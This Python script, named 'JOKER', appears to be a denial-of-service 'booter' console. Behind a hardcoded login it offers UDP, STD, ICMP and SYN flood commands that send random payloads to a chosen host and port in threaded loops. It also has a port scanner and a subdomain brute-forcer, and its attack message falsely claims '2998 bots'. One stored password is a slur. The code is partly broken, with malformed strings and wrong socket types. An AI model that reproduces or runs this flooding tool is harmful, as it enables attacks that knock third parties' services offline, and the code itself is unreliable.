#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("Connecting to servers...")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\x1b[1;90m                --> | Methods | <--                 
\x1b[1;35m╔═════════════════════════════════════════════════╗\x1b[0m
\x1b[1;32m║ udp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mUDP Flood        \x1b[1;35m║\x1b[0m
\x1b[1;35m║ std [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mSTD Flood        \x1b[1;32m║\x1b[0m          
\x1b[1;32m║ tcp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mTCP Flood        \x1b[1;35m║\x1b[0m
\x1b[1;35m║ dns [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mDNS Flood        \x1b[1;32m║\x1b[0m
\x1b[1;32m║ vse  [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mR6 Flood        \x1b[1;35m║\x1b[0m
\x1b[1;32m║ ack [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mACK FLood        \x1b[1;35m║\x1b[0m
\x1b[1;35m║ xmas [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mXMAS Flood      \x1b[1;32m║\x1b[0m
\x1b[1;35m╚═════════════════════════════════════════════════╝\x1b[0m
"""

info = """
"""

version = "3.2"

help = """
\x1b[1;90m            --> | Help | <--     \r\n
\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m
\x1b[1;32m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;35m║\x1b[0m
\x1b[1;32m║ bypass  \x1b[90m- \x1b[0mShows Bypass Commands     \x1b[1;35m║\x1b[0m
\x1b[1;35m║ methods \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;32m║\x1b[0m
\x1b[1;35m║ admin   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;32m║\x1b[0m
\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n
""

"""
statz = """

║              \033[00mSTATS\033[38;2;251;217;242m                     ║

\033[00m- Attacks: \033[38;2;251;217;242m{}                                        
\033[00m- Found Domains: \033[38;2;251;217;242m{}                                  
\033[00m- PINGS: \033[38;2;251;217;242m{}                                          
\033[00m- portSCANS: \033[38;2;251;217;242m{}                                      
\033[00m- GRABBED IPS: \033[38;2;251;217;242m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m
                                \x1b[1;35m ╦\x1b[1;32m╔═╗\x1b[1;35m╦╔═\x1b[1;32m╔═╗\x1b[1;35m╦═╗\x1b[0m
                                \x1b[1;35m ║\x1b[1;32m║ ║\x1b[1;35m╠╩╗\x1b[1;32m║╣ \x1b[1;35m╠╦╝\x1b[0m
                                \x1b[1;35m╚╝\x1b[1;32m╚═╝\x1b[1;35m╩ ╩\x1b[1;32m╚═╝\x1b[1;35m╩╚═\x1b[0m
\x1b[90m                              We are all clowns                                                     
"""

altbanner = """
                                \x1b[1;35m ╦\x1b[1;32m╔═╗\x1b[1;35m╦╔═\x1b[1;32m╔═╗\x1b[1;35m╦═╗\x1b[0m
                                \x1b[1;35m ║\x1b[1;32m║ ║\x1b[1;35m╠╩╗\x1b[1;32m║╣ \x1b[1;35m╠╦╝\x1b[0m
                                \x1b[1;35m╚╝\x1b[1;32m╚═╝\x1b[1;35m╩ ╩\x1b[1;32m╚═╝\x1b[1;35m╩╚═\x1b[0m
\x1b[90m                              We are all clowns                                                                                                                     
"""

cookie = open(".JOKER_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True


def synsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(65500, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global std

	while True:
		sys.stdout.write("\x1b]2;2 Online Users | 2998 Clowns | vF | User: root\x07")
		sin = input("\x1b[1;35mroot\x1b[1;32m@joker\n").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("JOKER version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[38;2;251;217;242m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[38;2;251;217;242m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[38;2;251;217;242m{}                                          ".format(tpings))
			print ("\033[00m- portSCANS: \033[38;2;251;217;242m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[38;2;251;217;242m{}\n                                    ".format(liips))
			main()
		elif sinput == "methods":
			print (method)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] {}\033[38;2;251;217;242m:\033[00m{} [\033[38;2;251;217;242mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] UPD Running processes: {}".format (uaid))
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] ICMP Running processes: {}".format (iaid))
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] SYN Running processes: {}".format (said))
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] STD Running Processes: {}".format (said))
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;JOKER |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/JOKER/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] Domain: https://{} \033[38;2;251;217;242m>\033[00m Converted: {} [\033[38;2;251;217;242mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;JOKER |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] Domain: {} [\033[38;2;251;217;242mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE host!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host: {} \033[00m[\033[38;2;251;217;242mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S I N F U L L |{}ms| D E M O N S\x07".format (stop))
						print ("JOKER: {}:{} | Time: {}ms [\033[38;2;251;217;242mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S I N F U L L |TIME OUT| D E M O N S\x07")
						print ("JOKER: {}:{} [\033[38;2;251;217;242mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
					punch = random._urandom(int(65500))
					threading.Thread(target=udpsender, args=(host, port, timer)).start()
				except ValueError:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host: {} invalid".format (host))
					main()
		elif sinput == "std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host: {} invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host: {} invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("\x1b[1;35m[+] Attack Has Been sent \x1b[1;32m2998 \x1b[1;35mbots [+]".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] {} Not a command".format(sinput))
			main()


try:
	users = ["root", "guests", "me"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m")
	if username in users:
		user = username
	else:
		print ("\x1b[1;35m[+] Not Working\x1b[1;35m: \x1b[0m")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman", "me"]
	password = getpass.getpass ("\x1b[1;32mPassword\x1b[1;32m: \x1b[0m")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[38;2;253;239;249mJOKER\033[38;2;253;239;249m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()
